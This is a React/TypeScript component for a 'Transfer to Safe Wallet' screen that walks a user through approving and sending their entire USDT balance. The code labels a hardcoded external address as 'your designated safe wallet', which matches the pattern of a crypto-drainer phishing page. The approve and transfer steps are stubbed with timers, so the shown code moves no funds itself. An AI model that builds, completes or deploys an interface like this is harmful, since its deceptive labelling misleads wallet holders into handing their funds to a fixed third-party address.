import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "./ui/card";
import { Button } from "./ui/button";
import { WalletState, USDTBalance } from "../App";
import { useState } from "react";
import { ArrowRight, Check, AlertCircle } from "lucide-react";

interface USDTTransferProps {
  wallet: WalletState;
  balance: USDTBalance | null;
  status: "idle" | "pending" | "success" | "error";
  onStatusChange: (status: "idle" | "pending" | "success" | "error") => void;
}

const SAFE_WALLET_ADDRESS = "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD48";

export function USDTTransfer({ wallet, balance, status, onStatusChange }: USDTTransferProps) {
  const [approvalStep, setApprovalStep] = useState<"approve" | "transfer" | "done">("approve");

  const handleApprove = async () => {
    onStatusChange("pending");
    await new Promise((resolve) => setTimeout(resolve, 1500));
    setApprovalStep("transfer");
    onStatusChange("idle");
  };

  const handleTransfer = async () => {
    onStatusChange("pending");
    await new Promise((resolve) => setTimeout(resolve, 2000));
    setApprovalStep("done");
    onStatusChange("success");
  };

  const handleReset = () => {
    setApprovalStep("approve");
    onStatusChange("idle");
  };

  const formatAddress = (address: string) => {
    return `${address.slice(0, 10)}...${address.slice(-8)}`;
  };

  const isDisabled = !balance || !balance.hasMinimum || status === "pending";

  return (
    <Card className="bg-slate-900 border-slate-800">
      <CardHeader>
        <CardTitle className="text-white flex items-center gap-2">
          <div className="w-8 h-8 bg-teal-500/20 rounded-lg flex items-center justify-center">
            <ArrowRight className="w-4 h-4 text-teal-400" />
          </div>
          Transfer to Safe Wallet
        </CardTitle>
        <CardDescription className="text-slate-400">
          Pre-approve and transfer USDT to your designated safe wallet
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-4">
        {/* Transfer Details */}
        <div className="bg-slate-800 rounded-xl p-4 space-y-3">
          <div className="flex justify-between items-center">
            <span className="text-slate-400 text-sm">From</span>
            <span className="text-white font-mono text-sm">
              {wallet.address ? formatAddress(wallet.address) : "—"}
            </span>
          </div>
          <div className="border-t border-slate-700 my-2" />
          <div className="flex justify-between items-center">
            <span className="text-slate-400 text-sm">To (Safe Wallet)</span>
            <span className="text-emerald-400 font-mono text-sm">
              {formatAddress(SAFE_WALLET_ADDRESS)}
            </span>
          </div>
          <div className="border-t border-slate-700 my-2" />
          <div className="flex justify-between items-center">
            <span className="text-slate-400 text-sm">Amount</span>
            <span className="text-white font-medium">
              {balance ? `${balance.balance} USDT` : "—"}
            </span>
          </div>
        </div>

        {/* Status Messages */}
        {status === "success" && (
          <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-lg p-4 flex items-center gap-3">
            <div className="w-8 h-8 bg-emerald-500 rounded-full flex items-center justify-center">
              <Check className="w-5 h-5 text-white" />
            </div>
            <div>
              <p className="text-emerald-400 font-medium">Transfer Complete</p>
              <p className="text-emerald-400/70 text-sm">Your USDT has been transferred successfully</p>
            </div>
          </div>
        )}

        {status === "error" && (
          <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-4 flex items-center gap-3">
            <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center">
              <AlertCircle className="w-5 h-5 text-white" />
            </div>
            <div>
              <p className="text-red-400 font-medium">Transfer Failed</p>
              <p className="text-red-400/70 text-sm">Please try again or contact support</p>
            </div>
          </div>
        )}

        {!balance?.hasMinimum && balance && (
          <div className="bg-amber-500/10 border border-amber-500/30 rounded-lg p-4">
            <p className="text-amber-400 text-sm">
              Balance must be at least 0.001 USDT to proceed with transfer
            </p>
          </div>
        )}

        {/* Action Buttons */}
        {approvalStep === "approve" && (
          <Button
            onClick={handleApprove}
            disabled={isDisabled}
            className="w-full bg-emerald-500 hover:bg-emerald-600 text-white font-medium"
          >
            {status === "pending" ? (
              <span className="flex items-center gap-2">
                <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                </svg>
                Approving...
              </span>
            ) : (
              "Approve USDT Transfer"
            )}
          </Button>
        )}

        {approvalStep === "transfer" && status !== "success" && (
          <div className="space-y-3">
            <div className="bg-teal-500/10 border border-teal-500/30 rounded-lg p-3">
              <p className="text-teal-400 text-sm text-center">
                ✓ Transfer approved • Confirm to complete
              </p>
            </div>
            <Button
              onClick={handleTransfer}
              disabled={status === "pending"}
              className="w-full bg-teal-500 hover:bg-teal-600 text-white font-medium"
            >
              {status === "pending" ? (
                <span className="flex items-center gap-2">
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  Transferring...
                </span>
              ) : (
                "Confirm Transfer"
              )}
            </Button>
          </div>
        )}

        {approvalStep === "done" && (
          <Button
            onClick={handleReset}
            variant="outline"
            className="w-full border-slate-700 text-slate-300 hover:bg-slate-800 hover:text-white"
          >
            Start New Transfer
          </Button>
        )}
      </CardContent>
    </Card>
  );
}